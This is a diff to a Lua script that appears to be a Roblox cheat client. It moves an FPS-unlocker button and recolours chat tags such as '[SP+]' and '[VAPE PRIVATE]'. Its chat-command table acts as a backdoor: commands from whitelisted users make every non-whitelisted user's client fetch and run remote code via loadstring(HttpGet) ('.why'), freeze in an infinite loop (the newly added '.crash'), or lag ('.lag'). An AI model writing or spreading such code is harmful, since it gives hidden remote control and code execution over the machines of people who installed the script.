@@ -10382,17 +10382,6 @@ task.spawn(function()
 	end
 end)
 
-runFunction(function()
-	FPSUnlocker = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "FPSUnlocker",
-		Function = function(callback)
-			if callback then
-				setfpscap(999)
-			end
-		end
-	})
-end)
-
 local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/ProReleased"))
 local function getLplrType()
 	local lplr_Type = 0
@@ -10533,7 +10522,7 @@ local commands = {
 			end
 		end
 	end,
-	[".troll"] = function()
+	[".why"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
 		end
@@ -10575,6 +10564,11 @@ local commands = {
 		end
 	end,
 	[".crash"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			while true do end
+		end
+	end,
+	[".lag"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
 			local RunService = game:GetService("RunService")
 			local player = game.Players.LocalPlayer
@@ -10737,7 +10731,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[SP+]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["pink"].."'>[SP+]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10749,7 +10743,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#ff00ff'>[SP+ OWNER💜]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#b800b8'>[VAPE PRIVATE]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
@@ -10761,7 +10755,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[SP+]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["pink"].."'>[SP+]</font> " .. msg.PrefixText
 					end
 					userType = 2
 				end
@@ -10771,3 +10765,14 @@ txt.OnIncomingMessage = function(msg)
 
 	return p
 end
+
+runFunction(function()
+	FPSUnlocker = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+		Name = "FPSUnlocker",
+		Function = function(callback)
+			if callback then
+				setfpscap(999)
+			end
+		end
+	})
+end)
